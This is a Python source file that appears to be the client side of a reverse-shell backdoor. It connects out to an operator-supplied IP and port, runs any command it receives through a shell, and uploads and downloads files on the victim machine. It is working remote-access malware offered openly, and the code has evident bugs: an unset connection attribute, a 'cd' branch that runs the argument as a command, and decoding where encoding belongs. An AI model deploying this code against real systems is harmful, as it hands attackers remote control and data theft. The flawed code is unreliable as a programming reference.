import socket #for creating TCP sockets
import subprocess #for running commandline commands
import simplejson #for python3 complatible json type data transfer
import os #for navigating in directories
import base64 #for encoding
import optparse #cor commandline arguments as input

class MySocket:
    def __init__(self,ip,port):
        my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        # creates object,socket.AF_INET=the address family (IPv4), socket.SOCK_STREAM = the socket type,TCP sockets
        my_connection.connect((ip,port))
        # connects to ip address through port specified
    
    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))
        
    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
            
    # function to execute commands and return the output
    def command_execution(self,command):
        return subprocess.check_output(command,shell=True)

    def execute_cd_command(self,directory):
        os.chdir(directory)
        return "cd to" + directory

    def get_file_contents(self,path):
        with open(path,"rb") as my_file:
            return base64.b64decode(my_file.read())
        
    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download completed"
        
    def start_socket(self):
        while True:
            command = self.json_recieve()
            # recieve 1024 kilo bytes of data from connection
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.command_execution(command[1])
                elif command[0] == "download":
                    command_output = self.get_file_contents(command[1])
                elif command[0] == "upload":
                    command_output = self.save_file(command[1],command[2])
                else:
                    command_output = self.command_execution(command)
            except Exception:
                command_output = "Error!!"
            self.json_send(command_output)
        self.my_connection.close()
        # closes the connection

def get_input():
    parse_obj = optparse.OptionParser()
    parse_obj.add_option("-i","--ipaddress",dest="ip",help="Enter IP address")
    parse_obj.add_option("-p","--port",dest="port",help="Enter port number")
    return parse_obj.parse_args()
    
user_input = get_input()[0]
mySocket_obj = MySocket(user_input.ip,user_input.port)
mySocket_obj.start_socket()